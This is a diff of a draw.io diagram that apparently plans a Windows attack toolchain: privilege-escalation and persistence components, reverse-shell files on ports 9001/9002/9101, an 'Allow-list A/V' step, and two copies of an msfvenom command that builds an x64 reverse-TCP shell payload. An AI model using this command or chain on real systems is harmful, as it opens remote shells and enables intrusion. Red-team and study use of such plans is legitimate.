@@ -1,4 +1,4 @@
-<mxfile host="app.diagrams.net" modified="2022-12-23T02:45:45.822Z" agent="5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" etag="2sVnDeLOnxunqtFV3QCr" version="20.7.4" type="github" pages="2">
+<mxfile host="app.diagrams.net" modified="2022-12-23T02:54:40.312Z" agent="5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" etag="XV-_1O5F0WU0ThRmfGnW" version="20.7.4" type="github" pages="2">
   <diagram id="C5RBs43oDa-KdzZeNtuy" name="Overall">
     <mxGraphModel dx="3054" dy="614" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="827" pageHeight="1169" math="0" shadow="0">
       <root>
@@ -50,25 +50,25 @@
         <mxCell id="G-sO2mh2Iyi2BEA4O4LV-19" value="Pers_Medium.cpp" style="swimlane;fontStyle=5;childLayout=stackLayout;horizontal=1;startSize=30;horizontalStack=0;resizeParent=1;resizeParentMax=0;resizeLast=0;collapsible=1;marginBottom=0;fillColor=#FF6666;" parent="G-sO2mh2Iyi2BEA4O4LV-17" vertex="1">
           <mxGeometry x="20" y="40" width="150" height="60" as="geometry" />
         </mxCell>
-        <mxCell id="G-sO2mh2Iyi2BEA4O4LV-21" value="Medium IL Tools Directory" style="text;strokeColor=none;fillColor=#FF6666;align=left;verticalAlign=middle;spacingLeft=4;spacingRight=4;overflow=hidden;points=[[0,0.5],[1,0.5]];portConstraint=eastwest;rotatable=0;" parent="G-sO2mh2Iyi2BEA4O4LV-19" vertex="1">
+        <mxCell id="G-sO2mh2Iyi2BEA4O4LV-21" value="Medium IL Tools Directory&#xa;(9001.exe / 9002.exe)" style="text;strokeColor=none;fillColor=#FF6666;align=left;verticalAlign=middle;spacingLeft=4;spacingRight=4;overflow=hidden;points=[[0,0.5],[1,0.5]];portConstraint=eastwest;rotatable=0;" parent="G-sO2mh2Iyi2BEA4O4LV-19" vertex="1">
           <mxGeometry y="30" width="150" height="30" as="geometry" />
         </mxCell>
-        <mxCell id="G-sO2mh2Iyi2BEA4O4LV-23" value="Reverse_9001.cpp&#xa;Reverse_9002.cpp" style="swimlane;fontStyle=5;childLayout=stackLayout;horizontal=1;startSize=30;horizontalStack=0;resizeParent=1;resizeParentMax=0;resizeLast=0;collapsible=1;marginBottom=0;fillColor=#FF6666;" parent="G-sO2mh2Iyi2BEA4O4LV-17" vertex="1">
+        <mxCell id="G-sO2mh2Iyi2BEA4O4LV-23" value="9001.cpp&#xa;9002.cpp" style="swimlane;fontStyle=5;childLayout=stackLayout;horizontal=1;startSize=30;horizontalStack=0;resizeParent=1;resizeParentMax=0;resizeLast=0;collapsible=1;marginBottom=0;fillColor=#FF6666;" parent="G-sO2mh2Iyi2BEA4O4LV-17" vertex="1">
           <mxGeometry x="200" y="40" width="150" height="60" as="geometry" />
         </mxCell>
-        <mxCell id="G-sO2mh2Iyi2BEA4O4LV-25" value="Medium IL Tools Directory" style="text;strokeColor=none;fillColor=#FF6666;align=left;verticalAlign=middle;spacingLeft=4;spacingRight=4;overflow=hidden;points=[[0,0.5],[1,0.5]];portConstraint=eastwest;rotatable=0;" parent="G-sO2mh2Iyi2BEA4O4LV-23" vertex="1">
+        <mxCell id="G-sO2mh2Iyi2BEA4O4LV-25" value="Medium IL Tools Directory&#xa;(9001.png / 9002.png)" style="text;strokeColor=none;fillColor=#FF6666;align=left;verticalAlign=middle;spacingLeft=4;spacingRight=4;overflow=hidden;points=[[0,0.5],[1,0.5]];portConstraint=eastwest;rotatable=0;" parent="G-sO2mh2Iyi2BEA4O4LV-23" vertex="1">
           <mxGeometry y="30" width="150" height="30" as="geometry" />
         </mxCell>
-        <mxCell id="G-sO2mh2Iyi2BEA4O4LV-30" value="9001.png&#xa;9002.png" style="swimlane;fontStyle=5;childLayout=stackLayout;horizontal=1;startSize=30;horizontalStack=0;resizeParent=1;resizeParentMax=0;resizeLast=0;collapsible=1;marginBottom=0;shadow=0;fillColor=#FF6666;" parent="G-sO2mh2Iyi2BEA4O4LV-17" vertex="1">
+        <mxCell id="G-sO2mh2Iyi2BEA4O4LV-30" value="9001.raw&#xa;9002.raw" style="swimlane;fontStyle=5;childLayout=stackLayout;horizontal=1;startSize=30;horizontalStack=0;resizeParent=1;resizeParentMax=0;resizeLast=0;collapsible=1;marginBottom=0;shadow=0;fillColor=#FF6666;" parent="G-sO2mh2Iyi2BEA4O4LV-17" vertex="1">
           <mxGeometry x="400" y="40" width="140" height="90" as="geometry" />
         </mxCell>
         <mxCell id="G-sO2mh2Iyi2BEA4O4LV-31" value="Attacker IP" style="text;strokeColor=none;fillColor=#FF6666;align=left;verticalAlign=middle;spacingLeft=4;spacingRight=4;overflow=hidden;points=[[0,0.5],[1,0.5]];portConstraint=eastwest;rotatable=0;shadow=0;" parent="G-sO2mh2Iyi2BEA4O4LV-30" vertex="1">
           <mxGeometry y="30" width="140" height="30" as="geometry" />
         </mxCell>
-        <mxCell id="G-sO2mh2Iyi2BEA4O4LV-32" value="Appropriate Port" style="text;strokeColor=none;fillColor=#FF6666;align=left;verticalAlign=middle;spacingLeft=4;spacingRight=4;overflow=hidden;points=[[0,0.5],[1,0.5]];portConstraint=eastwest;rotatable=0;shadow=0;" parent="G-sO2mh2Iyi2BEA4O4LV-30" vertex="1">
+        <mxCell id="G-sO2mh2Iyi2BEA4O4LV-32" value="Port (9001 / 9002)" style="text;strokeColor=none;fillColor=#FF6666;align=left;verticalAlign=middle;spacingLeft=4;spacingRight=4;overflow=hidden;points=[[0,0.5],[1,0.5]];portConstraint=eastwest;rotatable=0;shadow=0;" parent="G-sO2mh2Iyi2BEA4O4LV-30" vertex="1">
           <mxGeometry y="60" width="140" height="30" as="geometry" />
         </mxCell>
-        <mxCell id="G-sO2mh2Iyi2BEA4O4LV-37" value="msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp -n 1800 --pad-nops LHOST=IP LPORT=Port -f raw EXITFUNC=thread &amp;gt; payload_reverse_shell_port#.raw" style="shape=document;whiteSpace=wrap;html=1;boundedLbl=1;fillColor=#FF6666;" parent="G-sO2mh2Iyi2BEA4O4LV-17" vertex="1">
+        <mxCell id="G-sO2mh2Iyi2BEA4O4LV-37" value="msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp -n 1800 --pad-nops LHOST=IP LPORT=Port -f raw EXITFUNC=thread &amp;gt; port#.raw" style="shape=document;whiteSpace=wrap;html=1;boundedLbl=1;fillColor=#FF6666;" parent="G-sO2mh2Iyi2BEA4O4LV-17" vertex="1">
           <mxGeometry x="550" y="60" width="570" height="50" as="geometry" />
         </mxCell>
         <mxCell id="G-sO2mh2Iyi2BEA4O4LV-57" value="" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;entryX=0.5;entryY=0;entryDx=0;entryDy=0;" parent="WIyWlLk6GJQsqaUBKTNV-1" source="G-sO2mh2Iyi2BEA4O4LV-49" target="P6aCfQ930mBBJoiv-hOj-24" edge="1">
@@ -167,31 +167,42 @@
           <mxGeometry x="750" y="200" width="80" height="40" as="geometry" />
         </mxCell>
         <mxCell id="P6aCfQ930mBBJoiv-hOj-30" value="Update EOP Payload Code" style="swimlane;fillColor=#FF6666;" vertex="1" parent="WIyWlLk6GJQsqaUBKTNV-1">
-          <mxGeometry x="-1090" y="40" width="1130" height="140" as="geometry" />
+          <mxGeometry x="-1230" y="40" width="1300" height="170" as="geometry" />
         </mxCell>
-        <mxCell id="P6aCfQ930mBBJoiv-hOj-31" value="Pers_Medium.cpp" style="swimlane;fontStyle=5;childLayout=stackLayout;horizontal=1;startSize=30;horizontalStack=0;resizeParent=1;resizeParentMax=0;resizeLast=0;collapsible=1;marginBottom=0;fillColor=#FF6666;" vertex="1" parent="P6aCfQ930mBBJoiv-hOj-30">
-          <mxGeometry x="20" y="40" width="150" height="60" as="geometry" />
+        <mxCell id="P6aCfQ930mBBJoiv-hOj-33" value="DEVOBJ.cpp" style="swimlane;fontStyle=5;childLayout=stackLayout;horizontal=1;startSize=30;horizontalStack=0;resizeParent=1;resizeParentMax=0;resizeLast=0;collapsible=1;marginBottom=0;fillColor=#FF6666;" vertex="1" parent="P6aCfQ930mBBJoiv-hOj-30">
+          <mxGeometry x="200" y="40" width="150" height="70" as="geometry" />
         </mxCell>
-        <mxCell id="P6aCfQ930mBBJoiv-hOj-32" value="Medium IL Tools Directory" style="text;strokeColor=none;fillColor=#FF6666;align=left;verticalAlign=middle;spacingLeft=4;spacingRight=4;overflow=hidden;points=[[0,0.5],[1,0.5]];portConstraint=eastwest;rotatable=0;" vertex="1" parent="P6aCfQ930mBBJoiv-hOj-31">
-          <mxGeometry y="30" width="150" height="30" as="geometry" />
+        <mxCell id="P6aCfQ930mBBJoiv-hOj-34" value="Medium IL Tools Directory&#xa;(Reverse_9101.exe)" style="text;strokeColor=none;fillColor=#FF6666;align=left;verticalAlign=middle;spacingLeft=4;spacingRight=4;overflow=hidden;points=[[0,0.5],[1,0.5]];portConstraint=eastwest;rotatable=0;" vertex="1" parent="P6aCfQ930mBBJoiv-hOj-33">
+          <mxGeometry y="30" width="150" height="40" as="geometry" />
         </mxCell>
-        <mxCell id="P6aCfQ930mBBJoiv-hOj-33" value="Reverse_9001.cpp&#xa;Reverse_9002.cpp" style="swimlane;fontStyle=5;childLayout=stackLayout;horizontal=1;startSize=30;horizontalStack=0;resizeParent=1;resizeParentMax=0;resizeLast=0;collapsible=1;marginBottom=0;fillColor=#FF6666;" vertex="1" parent="P6aCfQ930mBBJoiv-hOj-30">
-          <mxGeometry x="200" y="40" width="150" height="60" as="geometry" />
-        </mxCell>
-        <mxCell id="P6aCfQ930mBBJoiv-hOj-34" value="Medium IL Tools Directory" style="text;strokeColor=none;fillColor=#FF6666;align=left;verticalAlign=middle;spacingLeft=4;spacingRight=4;overflow=hidden;points=[[0,0.5],[1,0.5]];portConstraint=eastwest;rotatable=0;" vertex="1" parent="P6aCfQ930mBBJoiv-hOj-33">
-          <mxGeometry y="30" width="150" height="30" as="geometry" />
-        </mxCell>
-        <mxCell id="P6aCfQ930mBBJoiv-hOj-35" value="9001.png&#xa;9002.png" style="swimlane;fontStyle=5;childLayout=stackLayout;horizontal=1;startSize=30;horizontalStack=0;resizeParent=1;resizeParentMax=0;resizeLast=0;collapsible=1;marginBottom=0;shadow=0;fillColor=#FF6666;" vertex="1" parent="P6aCfQ930mBBJoiv-hOj-30">
-          <mxGeometry x="400" y="40" width="140" height="90" as="geometry" />
+        <mxCell id="P6aCfQ930mBBJoiv-hOj-35" value="9101.raw" style="swimlane;fontStyle=5;childLayout=stackLayout;horizontal=1;startSize=30;horizontalStack=0;resizeParent=1;resizeParentMax=0;resizeLast=0;collapsible=1;marginBottom=0;shadow=0;fillColor=#FF6666;" vertex="1" parent="P6aCfQ930mBBJoiv-hOj-30">
+          <mxGeometry x="550" y="40" width="140" height="90" as="geometry" />
         </mxCell>
         <mxCell id="P6aCfQ930mBBJoiv-hOj-36" value="Attacker IP" style="text;strokeColor=none;fillColor=#FF6666;align=left;verticalAlign=middle;spacingLeft=4;spacingRight=4;overflow=hidden;points=[[0,0.5],[1,0.5]];portConstraint=eastwest;rotatable=0;shadow=0;" vertex="1" parent="P6aCfQ930mBBJoiv-hOj-35">
           <mxGeometry y="30" width="140" height="30" as="geometry" />
         </mxCell>
-        <mxCell id="P6aCfQ930mBBJoiv-hOj-37" value="Appropriate Port" style="text;strokeColor=none;fillColor=#FF6666;align=left;verticalAlign=middle;spacingLeft=4;spacingRight=4;overflow=hidden;points=[[0,0.5],[1,0.5]];portConstraint=eastwest;rotatable=0;shadow=0;" vertex="1" parent="P6aCfQ930mBBJoiv-hOj-35">
+        <mxCell id="P6aCfQ930mBBJoiv-hOj-37" value="Port (9101)" style="text;strokeColor=none;fillColor=#FF6666;align=left;verticalAlign=middle;spacingLeft=4;spacingRight=4;overflow=hidden;points=[[0,0.5],[1,0.5]];portConstraint=eastwest;rotatable=0;shadow=0;" vertex="1" parent="P6aCfQ930mBBJoiv-hOj-35">
           <mxGeometry y="60" width="140" height="30" as="geometry" />
         </mxCell>
-        <mxCell id="P6aCfQ930mBBJoiv-hOj-38" value="msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp -n 1800 --pad-nops LHOST=IP LPORT=Port -f raw EXITFUNC=thread &amp;gt; payload_reverse_shell_port#.raw" style="shape=document;whiteSpace=wrap;html=1;boundedLbl=1;fillColor=#FF6666;" vertex="1" parent="P6aCfQ930mBBJoiv-hOj-30">
-          <mxGeometry x="550" y="60" width="570" height="50" as="geometry" />
+        <mxCell id="P6aCfQ930mBBJoiv-hOj-38" value="msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp -n 1800 --pad-nops LHOST=IP LPORT=Port -f raw EXITFUNC=thread &amp;gt; port#.raw" style="shape=document;whiteSpace=wrap;html=1;boundedLbl=1;fillColor=#FF6666;" vertex="1" parent="P6aCfQ930mBBJoiv-hOj-30">
+          <mxGeometry x="710" y="60" width="570" height="50" as="geometry" />
+        </mxCell>
+        <mxCell id="P6aCfQ930mBBJoiv-hOj-41" value="Reverse_9001.cpp&#xa;Reverse_9002.cpp" style="swimlane;fontStyle=5;childLayout=stackLayout;horizontal=1;startSize=30;horizontalStack=0;resizeParent=1;resizeParentMax=0;resizeLast=0;collapsible=1;marginBottom=0;fillColor=#FF6666;" vertex="1" parent="P6aCfQ930mBBJoiv-hOj-30">
+          <mxGeometry x="370" y="40" width="150" height="70" as="geometry" />
+        </mxCell>
+        <mxCell id="P6aCfQ930mBBJoiv-hOj-42" value="Medium IL Tools Directory&#xa;(9101.png)" style="text;strokeColor=none;fillColor=#FF6666;align=left;verticalAlign=middle;spacingLeft=4;spacingRight=4;overflow=hidden;points=[[0,0.5],[1,0.5]];portConstraint=eastwest;rotatable=0;" vertex="1" parent="P6aCfQ930mBBJoiv-hOj-41">
+          <mxGeometry y="30" width="150" height="40" as="geometry" />
+        </mxCell>
+        <mxCell id="P6aCfQ930mBBJoiv-hOj-43" value="EOP.cpp" style="swimlane;fontStyle=5;childLayout=stackLayout;horizontal=1;startSize=30;horizontalStack=0;resizeParent=1;resizeParentMax=0;resizeLast=0;collapsible=1;marginBottom=0;shadow=0;fillColor=#FF6666;" vertex="1" parent="P6aCfQ930mBBJoiv-hOj-30">
+          <mxGeometry x="30" y="40" width="140" height="90" as="geometry">
+            <mxRectangle x="-827" y="400" width="90" height="30" as="alternateBounds" />
+          </mxGeometry>
+        </mxCell>
+        <mxCell id="P6aCfQ930mBBJoiv-hOj-44" value="Medium IL Tools Directory&#xa;(DEVOBJ.dll)" style="text;strokeColor=none;fillColor=#FF6666;align=left;verticalAlign=middle;spacingLeft=4;spacingRight=4;overflow=hidden;points=[[0,0.5],[1,0.5]];portConstraint=eastwest;rotatable=0;shadow=0;" vertex="1" parent="P6aCfQ930mBBJoiv-hOj-43">
+          <mxGeometry y="30" width="140" height="30" as="geometry" />
+        </mxCell>
+        <mxCell id="P6aCfQ930mBBJoiv-hOj-45" value="Medium IL Tools Directory&#xa;(Allow-list A/V)" style="text;strokeColor=none;fillColor=#FF6666;align=left;verticalAlign=middle;spacingLeft=4;spacingRight=4;overflow=hidden;points=[[0,0.5],[1,0.5]];portConstraint=eastwest;rotatable=0;shadow=0;" vertex="1" parent="P6aCfQ930mBBJoiv-hOj-43">
+          <mxGeometry y="60" width="140" height="30" as="geometry" />
         </mxCell>
         <mxCell id="P6aCfQ930mBBJoiv-hOj-39" value="" style="edgeStyle=orthogonalEdgeStyle;rounded=0;html=1;jettySize=auto;orthogonalLoop=1;fontSize=11;endArrow=block;endFill=0;endSize=8;strokeWidth=1;shadow=0;labelBackgroundColor=none;entryX=1;entryY=0.5;entryDx=0;entryDy=0;exitX=0;exitY=0.5;exitDx=0;exitDy=0;" edge="1" parent="WIyWlLk6GJQsqaUBKTNV-1" source="WIyWlLk6GJQsqaUBKTNV-10" target="P6aCfQ930mBBJoiv-hOj-30">
           <mxGeometry y="10" relative="1" as="geometry">
